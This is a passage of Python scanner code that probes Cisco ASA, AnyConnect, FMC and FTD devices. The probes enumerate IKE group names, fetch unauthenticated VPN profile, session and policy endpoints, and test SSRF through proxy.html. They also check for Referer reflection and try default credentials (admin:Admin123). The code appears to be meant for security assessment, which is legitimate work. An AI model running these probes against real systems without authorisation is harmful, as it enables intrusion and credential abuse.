            struct.pack('!HH', 0x800B, 1) +
            struct.pack('!HH', 0x800C, 28800)
        )
        transform_len = 8 + len(transform_attrs)
        transform_payload = struct.pack('!BBHBBH', 0, 0, transform_len, 1, 1, 0) + transform_attrs

        proposal_len = 8 + len(transform_payload)
        proposal_payload = struct.pack('!BBHBBBB', 0, 0, proposal_len, 1, 1, 0, 1) + transform_payload

        sa_body = struct.pack('!II', 1, 1) + proposal_payload
        sa_len = 4 + len(sa_body)
        sa_payload = struct.pack('!BBH', 0x0A, 0, sa_len) + sa_body  # next=KE

        ke_value = b'\x00' * 128
        ke_len = 4 + len(ke_value)
        ke_payload = struct.pack('!BBH', 0x05, 0, ke_len) + ke_value  # next=Nonce

        nonce_value = os.urandom(16)
        nonce_len = 4 + len(nonce_value)
        nonce_payload = struct.pack('!BBH', 0x05, 0, nonce_len) + nonce_value  # next=ID

        # ID payload: type=0x11 (KEY_ID), proto=0, port=0, data=group_name_bytes
        id_body = struct.pack('!BBH', 0x11, 0, 0) + group_name_bytes
        id_len = 4 + len(id_body)
        id_payload = struct.pack('!BBH', 0, 0, id_len) + id_body  # next=none

        body = sa_payload + ke_payload + nonce_payload + id_payload
        total_len = 28 + len(body)

        ike_header = (
            initiator_cookie +
            responder_cookie +
            struct.pack('!BBBBII', 0x04, 0x10, 0x04, 0x00, 0, total_len)
        )
        return ike_header + body

    def _is_notify_no_proposal(data):
        """Return True if response looks like ISAKMP NOTIFY / No Proposal Chosen (0x0018=24)."""
        # ISAKMP NOTIFY exchange_type=5; payload chain starts at byte 28.
        # We do a loose scan for the 0x0018 notify message type anywhere in the payload.
        if len(data) < 36:
            return False
        return b'\x00\x18' in data[28:]

    accepted_groups = []
    findings = []

    for name in group_names:
        name_bytes = name.encode('utf-8')
        pkt = _build_aggressive_packet(name_bytes)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            t0 = time.monotonic()
            sock.sendto(pkt, (host, port))
            try:
                data, _ = sock.recvfrom(4096)
                elapsed = time.monotonic() - t0
            finally:
                sock.close()

            # A valid group produces a substantive aggressive-mode response;
            # an invalid group typically gets a rapid NOTIFY/No-Proposal-Chosen.
            if not _is_notify_no_proposal(data) and len(data) > 60:
                accepted_groups.append((name, elapsed, len(data)))
        except (socket.timeout, OSError):
            pass  # no response = inconclusive, not "rejected"

    if accepted_groups:
        group_list = ", ".join(
            f'"{g}" ({sz}B, {lat:.2f}s)' for g, lat, sz in accepted_groups
        )
        findings.append({
            "severity": "CRITICAL",
            "title": "VPN_GROUP_NAME_ENUMERATION_POSSIBLE",
            "detail": (
                f"IKEv1 aggressive mode GroupName oracle confirmed on UDP/{port}. "
                f"Accepted group name(s): {group_list}. "
                "Valid group names allow targeted PSK offline-cracking and narrow "
                "authentication brute-force to specific tunnel-groups. "
                "Ref: Cisco ASA tunnel-group enumeration via IKE aggressive mode."
            ),
            "host": host,
            "port": port,
        })
    else:
        findings.append({
            "severity": "INFO",
            "title": "VPN_GROUP_NAME_ENUMERATION_NO_MATCHES",
            "detail": (
                f"IKEv1 aggressive mode GroupName probe on UDP/{port}: "
                f"none of the {len(group_names)} tested names produced a distinguishable "
                "response. Service may be down, hardened, or using IKEv2."
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_l2tp_ipsec(host, port=1701, timeout=3.0):
    """
    L2TP/IPSec endpoint detection on UDP/1701 and NAT-T probe on UDP/4500.

    L2TP probe: sends a minimal SCCRQ (Start-Control-Connection-Request) with
    a Protocol Version AVP.  Any L2TP response indicates an active L2TP endpoint.

    NAT-T probe: sends 8 null bytes on UDP/4500.  Any response indicates
    IPSec NAT-Traversal is active (RFC 3947).  The ASA uses this for L2TP/IPSec
    clients behind NAT as well as AnyConnect with NAT-T enabled.

    L2TP SCCRQ packet layout (minimal, per RFC 2661):
      Flags/Version (2):  0xC802  (T=1 mandatory, L=1, S=1, ver=2)
      Length       (2):  packet length
      Tunnel ID    (2):  0  (assigned by peer)
      Session ID   (2):  0
      Ns           (2):  0  (sequence number)
      Nr           (2):  0  (expected sequence number)
      AVP — Protocol Version:
        Flags/Length (2): 0x0008  (mandatory=0, length=8)
        Vendor ID    (2): 0x0000
        Attribute    (2): 0x0001  (Protocol Version)
        Value        (2): 0x0100  (version 1, revision 0)
    """
    findings = []

    # ── L2TP probe ────────────────────────────────────────────────────────────
    # Header: flags+ver, length, tunnel_id, session_id, Ns, Nr
    l2tp_header = struct.pack('!HHHHHH', 0xC802, 20, 0, 0, 0, 0)
    # Protocol Version AVP: flags/len=0x0008, vendor=0, attr=1, value=0x0100
    avp_proto_version = struct.pack('!HHH2s', 0x0008, 0x0000, 0x0001, b'\x01\x00')
    sccrq = l2tp_header + avp_proto_version

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(sccrq, (host, port))
        try:
            data, _ = sock.recvfrom(4096)
        finally:
            sock.close()

        findings.append({
            "severity": "MEDIUM",
            "title": "L2TP_ENDPOINT_ACTIVE",
            "detail": (
                f"L2TP endpoint responded on UDP/{port} to SCCRQ probe. "
                f"Response length: {len(data)} bytes. "
                "L2TP/IPSec exposes legacy IKEv1 negotiation; verify IPSec policy "
                "enforces AES/SHA2 and disables 3DES/MD5/DH-group-2."
            ),
            "host": host,
            "port": port,
        })
    except (socket.timeout, OSError):
        findings.append({
            "severity": "INFO",
            "title": "L2TP_ENDPOINT_NO_RESPONSE",
            "detail": f"No L2TP response on UDP/{port} within {timeout}s.",
            "host": host,
            "port": port,
        })

    # ── IPSec NAT-T probe (UDP/4500) ──────────────────────────────────────────
    nat_t_port = 4500
    keepalive = b'\x00' * 8  # NAT-T keepalive / IKE non-ESP marker probe

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(keepalive, (host, nat_t_port))
        try:
            data, _ = sock.recvfrom(4096)
        finally:
            sock.close()

        findings.append({
            "severity": "MEDIUM",
            "title": "IPSEC_NAT_T_ACTIVE",
            "detail": (
                f"IPSec NAT-Traversal endpoint responded on UDP/{nat_t_port}. "
                f"Response length: {len(data)} bytes. "
                "NAT-T encapsulates ESP in UDP; confirms IPSec VPN is reachable through NAT. "
                "Ensure IKE aggressive mode is disabled and PSK is not in use."
            ),
            "host": host,
            "port": nat_t_port,
        })
    except (socket.timeout, OSError):
        findings.append({
            "severity": "INFO",
            "title": "IPSEC_NAT_T_NO_RESPONSE",
            "detail": f"No response to NAT-T probe on UDP/{nat_t_port} within {timeout}s.",
            "host": host,
            "port": nat_t_port,
        })

    return findings


def probe_anyconnect_profile_exposure(host, port=443, timeout=5.0):
    """AnyConnect profile XML exposure via unauthenticated HTTPS probes.

    AnyConnect profile XML files are pushed to clients at connect time from
    the ASA's CACHE/stc/profiles/ hierarchy and from /profiles/. A
    misconfigured or unpatched ASA may serve these without authentication.
    Profile XMLs contain: VPN gateway FQDNs/IPs, group policies, split-tunnel
    networks, banner text, and protocol preferences.

    /+CSCOU+/win/binaries/ stores AnyConnect installer packages pushed to
    clients — accessible without auth by design on some ASA versions; exposed
    installers allow version fingerprinting and may contain embedded credentials
    in pre-configured profiles.
    """
    base = f'https://{host}:{port}' if port != 443 else f'https://{host}'
    findings = []

    probes = [
        ('/profiles/AnyConnect.xml',        'CRITICAL', 'ANYCONNECT_PROFILE_EXPOSED',
         'AnyConnect profile XML readable without authentication — '
         'discloses VPN gateway IPs, group policies, split-tunnel networks, banners.'),
        ('/profiles/',                       'HIGH',     'ANYCONNECT_PROFILES_DIRECTORY_EXPOSED',
         'AnyConnect profiles directory accessible without authentication — '
         'enumerate all configured VPN profiles and gateway identifiers.'),
        ('/CACHE/stc/profiles/',             'HIGH',     'PROFILE_CACHE_ACCESSIBLE',
         'ASA profile cache directory readable — '
         'lists all pushed AnyConnect XML profiles including per-group variants.'),
        ('/+CSCOU+/win/binaries/',           'MEDIUM',   'ANYCONNECT_BINARY_CACHE_ACCESSIBLE',
         'AnyConnect installer binary cache accessible without authentication — '
         'version fingerprinting; pre-configured profiles may contain embedded credentials.'),
    ]

    for path, severity, title, detail_msg in probes:
        sc, body, hdrs, _ = _get(f'{base}{path}', timeout=timeout)
        if sc == 200:
            # For the binary cache path, require evidence of installer content
            if path == '/+CSCOU+/win/binaries/':
                indicators = [x for x in ('.pkg', '.msi', '.dmg', '.exe', 'anyconnect')
                              if x in body.lower()]
                if not indicators:
                    continue
            findings.append({
                'severity': severity,
                'title': title,
                'detail': (
                    f'{detail_msg} '
                    f'URL: {base}{path} -> HTTP 200, {len(body)} bytes.'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_ssl_vpn_split_tunneling(host, port=443, session_cookie: str = None, timeout=5.0):
    """Split tunneling configuration leak via WebVPN session endpoints.

    Split tunnel configuration is a group-policy attribute on the ASA
    (split-tunnel-policy tunnelspecified / tunnelall / excludespecified,
    split-tunnel-network-list <acl>). When readable without a valid session,
    it reveals the internal network topology the ASA considers on-prem.

    session_stats.html and the session attribute API may return split-tunnel
    include/exclude network lists in the response body even with a null or
    invalid session cookie on some ASA firmware versions.
    """
    base = f'https://{host}:{port}' if port != 443 else f'https://{host}'
    findings = []
    cookies = {}
    if session_cookie:
        cookies['webvpn'] = session_cookie

    # Probe 1: session_stats page — may include split-tunnel network list
    sc, body, hdrs, _ = _get(f'{base}/+CSCOE+/session_stats.html',
                              cookies=cookies, timeout=timeout)
    if sc == 200:
        split_indicators = []
        for pattern in (r'(?:split.tunnel|splitTunnel)[^<"\']{0,200}',
                        r'\b(?:include|exclude)\s+(?:network|route)[^<"\']{0,120}',
                        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}'):
            for m in re.finditer(pattern, body, re.I):
                split_indicators.append(m.group(0)[:80])
        if split_indicators:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SPLIT_TUNNEL_CONFIG_EXPOSED',
                'detail': (
                    f'session_stats.html returned HTTP 200 at {base}/+CSCOE+/session_stats.html '
                    f'and contains split-tunnel network data: '
                    + '; '.join(split_indicators[:5])
                ),
                'host': host,
                'port': port,
            })

    # Probe 2: session attributes API
    sc2, body2, hdrs2, _ = _get(
        f'{base}/+CSCOE+/session?operation=getSessionAttributes',
        cookies=cookies, timeout=timeout)
    if sc2 == 200 and ('splitTunnel' in body2 or 'split_tunnel' in body2.lower()
                       or re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}', body2)):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SPLIT_TUNNEL_CONFIG_EXPOSED',
            'detail': (
                f'Session attributes API at {base}/+CSCOE+/session?operation=getSessionAttributes '
                f'returned HTTP 200 with split-tunnel network ranges. '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: VPN component info
    sc3, body3, hdrs3, _ = _get(f'{base}/+CSCOE+/np_cmpt_info',
                                 cookies=cookies, timeout=timeout)
    if sc3 == 200:
        findings.append({
            'severity': 'LOW',
            'title': 'VPN_COMPONENT_INFO_ACCESSIBLE',
            'detail': (
                f'VPN component info endpoint at {base}/+CSCOE+/np_cmpt_info '
                f'returned HTTP 200 ({len(body3)} bytes) without an authenticated session. '
                f'May disclose internal component versions or network parameters.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_vpn_concurrent_sessions(host, port=443, timeout=5.0):
    """Session limit and active VPN user enumeration probes.

    Some ASA firmware versions expose a session list endpoint and REST API
    session routes without authentication. Enumerating active VPN usernames
    and source IPs from an unauthenticated vantage is a direct pre-auth
    information disclosure (CRITICAL).

    Session caching probe: submitting the same credential set twice in rapid
    succession and receiving an immediate 200 on the second attempt indicates
    the ASA caches authenticated sessions server-side without re-verifying,
    allowing session-fixation or replay attacks (MEDIUM).
    """
    base = f'https://{host}:{port}' if port != 443 else f'https://{host}'
    findings = []

    # Probe 1: session list HTML (legacy firmware surface)
    sc, body, hdrs, _ = _get(f'{base}/+CSCOE+/session_list.html', timeout=timeout)
    if sc == 200 and any(k in body.lower() for k in ('username', 'session', 'vpn', 'user')):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'SESSION_LIST_ACCESSIBLE',
            'detail': (
                f'Active VPN session list at {base}/+CSCOE+/session_list.html '
                f'returned HTTP 200 ({len(body)} bytes) without authentication. '
                'Active VPN usernames and source IPs may be enumerable. '
                f'Body excerpt: {body[:400]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: REST API VPN session endpoints without auth
    for ep in ('/api/v1/vpn/users', '/api/v1/sessions'):
        sc2, body2, hdrs2, _ = _get(f'{base}{ep}', timeout=timeout)
        if sc2 == 200 and body2:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'VPN_SESSION_API_UNAUTHENTICATED',
                'detail': (
                    f'VPN session REST endpoint {base}{ep} returned HTTP 200 '
                    f'without authentication ({len(body2)} bytes). '
                    'Active session data (usernames, IPs, tunnel-groups) readable. '
                    f'Body excerpt: {body2[:300]}'
                ),
                'host': host,
                'port': port,
            })

    # Probe 3: session caching — double-POST with probe credentials
    # Fetch CSRF token first
    sc_l, body_l, hdrs_l, ck_l = _get(f'{base}/+CSCOE+/logon.html', timeout=timeout)
    csrf = parse_csrf_token(body_l) if sc_l == 200 else None
    if csrf:
        probe_data = {
            'username': '__session_cache_probe__',
            'password': '__x__',
            'tgroup': 'DefaultWEBVPNGroup',
            'csrf_token': csrf,
        }
        t0 = time.monotonic()
        _post(f'{base}/+webvpn+/index.html', data=probe_data, cookies=ck_l, timeout=timeout)
        elapsed_first = time.monotonic() - t0

        t1 = time.monotonic()
        sc_r2, body_r2, hdrs_r2, _ = _post(
            f'{base}/+webvpn+/index.html', data=probe_data, cookies=ck_l, timeout=timeout)
        elapsed_second = time.monotonic() - t1

        # Session cache indicator: second response significantly faster + 200
        if sc_r2 == 200 and elapsed_second < 0.3 and elapsed_first > 0.5:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SESSION_CACHING_VULNERABILITY',
                'detail': (
                    f'Second auth POST to {base}/+webvpn+/index.html returned HTTP 200 '
                    f'in {elapsed_second:.3f}s (first attempt: {elapsed_first:.3f}s). '
                    'Rapid second-attempt success suggests server-side session caching '
                    'without credential re-verification — potential session replay surface.'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_clientless_bookmark_injection(host, port=443, timeout=5.0):
    """Clientless SSL VPN bookmark injection and SSRF probes.

    The clientless WebVPN portal renders user-controlled content through an
    ASA-side rewriting proxy. Vulnerabilities:

    1. Referer reflection — some ASA versions echo the HTTP Referer header
       into the portal response body without sanitization (XSS surface).
    2. Internal proxy abuse — /+CSCOE+/proxy.html?target= proxies HTTP requests
       through the ASA to internal hosts. Without auth-gating this endpoint,
       it is a server-side request forgery (SSRF) vector into internal networks
       the ASA can reach (admin interfaces, internal APIs, metadata services).
    3. Unauthenticated script inclusion — /+CSCOE+/portal_inc_file.js serves
       portal JavaScript without session validation on some firmware; content
       may disclose bookmarks, application access lists, or internal hostnames.

    From ch05: clientless VPN uses a URL rewriting proxy that fetches internal
    resources on behalf of the authenticated user. The proxy endpoint being
    accessible without auth collapses the clientless architecture into a direct
    SSRF primitive.
    """
    base = f'https://{host}:{port}' if port != 443 else f'https://{host}'
    findings = []

    # Probe 1: Referer reflection in portal
    evil_referer = 'http://evil.example.com/'
    sc, body, hdrs, _ = _get(
        f'{base}/+CSCOE+/portal.html',
        headers={'Referer': evil_referer},
        timeout=timeout,
    )
    if sc == 200 and 'evil.example.com' in body:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'REFERER_REFLECTED_IN_PORTAL',
            'detail': (
                f'HTTP Referer header value reflected in portal.html response body '
                f'at {base}/+CSCOE+/portal.html. Referer sent: {evil_referer}. '
                'Reflected in response without sanitization — XSS surface for phishing '
                'campaigns targeting VPN users.'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: Internal proxy SSRF via proxy.html
    ssrf_target = 'http://127.0.0.1/'
    sc2, body2, hdrs2, _ = _get(
        f'{base}/+CSCOE+/proxy.html?target={urllib.parse.quote(ssrf_target, safe="")}',
        timeout=timeout,
    )
    if sc2 == 200 and len(body2) > 0:
        # Distinguish a proxied response from a redirect-to-logon
        is_logon = any(k in body2.lower() for k in ('logon', 'csrf_token', 'username'))
        if not is_logon:
            findings.append({
                'severity': 'HIGH',
                'title': 'SSRF_VIA_VPN_PROXY',
                'detail': (
                    f'Clientless VPN proxy endpoint at {base}/+CSCOE+/proxy.html '
                    f'returned HTTP 200 for target={ssrf_target} without authentication '
                    f'({len(body2)} bytes). '
                    'Internal proxy accessible pre-auth — SSRF to internal ASA-reachable '
                    'hosts: admin panels, internal APIs, cloud metadata (169.254.169.254). '
                    f'Body excerpt: {body2[:300]}'
                ),
                'host': host,
                'port': port,
            })

    # Probe 3: Portal JS inclusion without auth
    sc3, body3, hdrs3, _ = _get(f'{base}/+CSCOE+/portal_inc_file.js', timeout=timeout)
    if sc3 == 200 and len(body3) > 0:
        # Check for internal hostname or bookmark references embedded in JS
        bookmark_hits = re.findall(
            r'(?:bookmark|url|href|target)\s*[=:]\s*["\']([^"\']{4,120})["\']',
            body3, re.I)
        findings.append({
            'severity': 'LOW',
            'title': 'PORTAL_SCRIPT_ACCESSIBLE_UNAUTHENTICATED',
            'detail': (
                f'Portal include JS at {base}/+CSCOE+/portal_inc_file.js '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication. '
                + (f'Embedded URLs/bookmarks: {bookmark_hits[:5]}' if bookmark_hits
                   else 'No obvious bookmarks extracted; review full JS content.')
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_fmc_rest_api(host, port=443, timeout=5.0):
    """Probe Cisco FMC (Firepower Management Center) REST API for auth bypass and disclosure.

    Synthesized from: Chapter 12 — North-South Defense: Secure Firewall and the
    Macrosegmentation Strategy. FMC REST API is the central management plane for
    FTD devices; unauthenticated access or default credentials expose policy config,
    domain inventory, and the full threat defense rule set.

    Endpoints probed:
      POST /api/fmc_platform/v1/auth/generatetoken  — default creds auth attempt
      GET  /api/fmc_config/v1/domain                — domain list without auth
      GET  /api/fmc_platform/v1/info/serverversion  — version disclosure
      GET  /api/fmc_config/v1/domain/{uuid}/policy/accesspolicies — ACP unauth read
    """
    _DEFAULT_UUID = '0050568A-0000-0ed3-0000-000000000001'
    base = f'https://{host}:{port}'
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _fmc_get(path, headers=None):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace'), dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, '', {}
        except Exception:
            return None, '', {}

    def _fmc_post(path, data=b'', headers=None):
        url = f'{base}{path}'
        req = urllib.request.Request(url, data=data, method='POST', headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace'), dict(r.headers)
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, dict(e.headers) if hasattr(e, 'headers') else {}
        except Exception:
            return None, '', {}

    # Probe 1: POST generatetoken with empty Basic auth creds
    empty_basic = base64.b64encode(b':').decode()
    sc1, body1, hdrs1 = _fmc_post(
        '/api/fmc_platform/v1/auth/generatetoken',
        headers={
            'Authorization': f'Basic {empty_basic}',
            'Content-Type': 'application/json',
        },
    )
    if sc1 == 204 and hdrs1.get('X-auth-access-token'):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FMC_API_DEFAULT_CREDS',
            'detail': (
                f'FMC REST API at {base}/api/fmc_platform/v1/auth/generatetoken '
                f'returned HTTP 204 with X-auth-access-token header using empty '
                f'Basic auth credentials. Full management plane access: policy read/write, '
                f'device inventory, deployment control. '
                f'Token: {hdrs1.get("X-auth-access-token", "")[:40]}...'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: GET domain list without auth
    sc2, body2, hdrs2 = _fmc_get(
        '/api/fmc_config/v1/domain',
        headers={'Accept': 'application/json'},
    )
    if sc2 == 200 and len(body2) > 0 and ('items' in body2 or 'name' in body2):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FMC_DOMAIN_LIST_UNAUTH',
            'detail': (
                f'FMC domain list at {base}/api/fmc_config/v1/domain returned '
                f'HTTP 200 ({len(body2)} bytes) without authentication. '
                f'Domain inventory exposed — UUIDs required for all subsequent '
                f'policy API calls; this is the prerequisite for full ACP enumeration. '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: GET server version without auth
    sc3, body3, hdrs3 = _fmc_get(
        '/api/fmc_platform/v1/info/serverversion',
        headers={'Accept': 'application/json'},
    )
    if sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'FMC_VERSION_DISCLOSURE',
            'detail': (
                f'FMC server version endpoint at {base}/api/fmc_platform/v1/info/serverversion '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication. '
                f'Version string enables targeted CVE matching against known FMC vulnerabilities '
                f'(e.g. CSCvr56xxx series). Body: {body3[:400]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 4: GET access control policies without auth
    sc4, body4, hdrs4 = _fmc_get(
        f'/api/fmc_config/v1/domain/{_DEFAULT_UUID}/policy/accesspolicies',
        headers={'Accept': 'application/json'},
    )
    if sc4 == 200 and len(body4) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FMC_ACCESS_POLICIES_UNAUTH',
            'detail': (
                f'FMC Access Control Policy list at '
                f'{base}/api/fmc_config/v1/domain/{_DEFAULT_UUID}/policy/accesspolicies '
                f'returned HTTP 200 ({len(body4)} bytes) without authentication. '
                f'Full ACP rule set readable — exposes permitted/denied traffic flows, '
                f'zone segmentation, IPS policy bindings, and macrosegmentation strategy. '
                f'Body excerpt: {body4[:300]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_ftd_rest_api(host, port=443, timeout=5.0):
    """Probe Cisco FTD (Firepower Threat Defense) device REST API for auth bypass.

    Synthesized from: Chapter 12 — FTD exposes its own REST API (FDM API) on managed
    devices when Firepower Device Manager is enabled. Default admin credentials and
    unauthenticated object reads break the assumption that FTD is only accessible
    via FMC policy push.

    Endpoints probed:
      GET  /api/fdm/latest/devicesettings/default/devicehostnames — hostname unauth
      POST /api/fdm/latest/fdm/token with default admin:Admin123  — default creds
      GET  /api/fdm/latest/object/networks                        — network objects unauth
      GET  /api/fdm/latest/policy/accesspolicies                  — ACP unauth read
    """
    base = f'https://{host}:{port}'
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _ftd_get(path, headers=None):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace'), dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, '', {}
        except Exception:
            return None, '', {}

    def _ftd_post(path, payload, headers=None):
        url = f'{base}{path}'
        data = json.dumps(payload).encode('utf-8')
        h = {'Content-Type': 'application/json', 'Accept': 'application/json'}
        if headers:
            h.update(headers)
        req = urllib.request.Request(url, data=data, method='POST', headers=h)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace'), dict(r.headers)
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, {}
        except Exception:
            return None, '', {}

    # Probe 1: GET device hostname without auth
    sc1, body1, _ = _ftd_get(
        '/api/fdm/latest/devicesettings/default/devicehostnames',
        headers={'Accept': 'application/json'},
    )
    if sc1 == 200 and len(body1) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FTD_HOSTNAME_UNAUTH',
            'detail': (
                f'FTD device hostname endpoint at '
                f'{base}/api/fdm/latest/devicesettings/default/devicehostnames '
                f'returned HTTP 200 ({len(body1)} bytes) without authentication. '
                f'Device identity exposed pre-auth — confirms FDM API surface and '
                f'supplies hostname for further enumeration. Body: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: POST token with default admin:Admin123
    sc2, body2, _ = _ftd_post(
        '/api/fdm/latest/fdm/token',
        {'grant_type': 'password', 'username': 'admin', 'password': 'Admin123'},
    )
    if sc2 == 200 and 'access_token' in body2:
        try:
            token_data = json.loads(body2)
            token_snippet = token_data.get('access_token', '')[:40]
        except Exception:
            token_snippet = body2[:40]
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FTD_DEFAULT_CREDS',
            'detail': (
                f'FTD FDM API token endpoint at {base}/api/fdm/latest/fdm/token '
                f'returned HTTP 200 with access_token using credentials admin:Admin123. '
                f'Full device management access — policy config, interface settings, '
                f'routing, NAT, VPN. Immediate lateral movement surface for network '
                f'pivoting through segmentation boundaries. '
                f'Token prefix: {token_snippet}...'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: GET network objects without auth
    sc3, body3, _ = _ftd_get(
        '/api/fdm/latest/object/networks',
        headers={'Accept': 'application/json'},
    )
    if sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'FTD_NETWORK_OBJECTS_UNAUTH',
            'detail': (
                f'FTD network objects at {base}/api/fdm/latest/object/networks '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication. '
                f'Internal network object inventory exposed — subnets, host definitions, '
                f'and address groups used in ACP rules. Maps internal IP space. '
                f'Body excerpt: {body3[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 4: GET access policies without auth
    sc4, body4, _ = _ftd_get(
        '/api/fdm/latest/policy/accesspolicies',
        headers={'Accept': 'application/json'},
    )
    if sc4 == 200 and len(body4) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'FTD_ACCESS_POLICY_UNAUTH',
            'detail': (
                f'FTD access policy list at {base}/api/fdm/latest/policy/accesspolicies '
                f'returned HTTP 200 ({len(body4)} bytes) without authentication. '
                f'ACP rule set readable — exposes zone pairs, trust/block decisions, '
                f'IPS policy bindings, and full macrosegmentation topology. '
                f'Body excerpt: {body4[:300]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_fmc_ssl_policy(host, port=443, timeout=5.0):
    """Probe FMC SSL Decryption Policy endpoints for unauthenticated exposure.

    Synthesized from: Chapter 12 — SSL decryption policy (Decrypt-Resign, Decrypt-Known-Key,
    Do Not Decrypt) is configured via FMC and pushed to FTD. Unauthenticated reads of
    SSL policy objects expose certificate trust anchors, PKI trustpoints, and enrollment
    configs — the material needed to forge trusted intercept certificates.

    Endpoints probed:
      GET /api/fmc_config/v1/domain/{uuid}/policy/ssldecryptionpolicies
      GET /api/fmc_config/v1/domain/{uuid}/object/pkitrustpoints
      GET /api/fmc_config/v1/domain/{uuid}/object/certenrollments
    """
    _DEFAULT_UUID = '0050568A-0000-0ed3-0000-000000000001'
    base = f'https://{host}:{port}'
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(url, headers={'Accept': 'application/json'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read().decode('utf-8', errors='replace')
        except urllib.error.HTTPError as e:
            return e.code, ''
        except Exception:
            return None, ''

    # Probe 1: SSL decryption policies
    sc1, body1 = _get(
        f'/api/fmc_config/v1/domain/{_DEFAULT_UUID}/policy/ssldecryptionpolicies'
    )
    if sc1 == 200 and len(body1) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'SSL_DECRYPTION_POLICY_READABLE',
            'detail': (
                f'FMC SSL decryption policy list at '
                f'{base}/api/fmc_config/v1/domain/{_DEFAULT_UUID}/policy/ssldecryptionpolicies '
                f'returned HTTP 200 ({len(body1)} bytes) without authentication. '
                f'Exposes which traffic categories are decrypted, bypass rules for sensitive '
                f'categories (healthcare, financial), and which certificate is used for '
                f'Decrypt-Resign operations — the intercept CA identity. '
                f'Body excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: PKI trustpoints
    sc2, body2 = _get(
        f'/api/fmc_config/v1/domain/{_DEFAULT_UUID}/object/pkitrustpoints'
    )
    if sc2 == 200 and len(body2) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'PKI_TRUSTPOINTS_READABLE',
            'detail': (
                f'FMC PKI trustpoints at '
                f'{base}/api/fmc_config/v1/domain/{_DEFAULT_UUID}/object/pkitrustpoints '
                f'returned HTTP 200 ({len(body2)} bytes) without authentication. '
                f'Certificate trust chain exposed — trustpoint names, CA certificate references, '
                f'and enrollment method. Enables targeted CA impersonation or trustpoint '
                f'substitution attacks if combined with write access. '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: Certificate enrollment configs
    sc3, body3 = _get(
        f'/api/fmc_config/v1/domain/{_DEFAULT_UUID}/object/certenrollments'
    )
    if sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'CERT_ENROLLMENT_READABLE',
            'detail': (
                f'FMC certificate enrollment config at '
                f'{base}/api/fmc_config/v1/domain/{_DEFAULT_UUID}/object/certenrollments '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication. '
                f'Enrollment configuration exposed — SCEP/EST URLs, CA identities, '
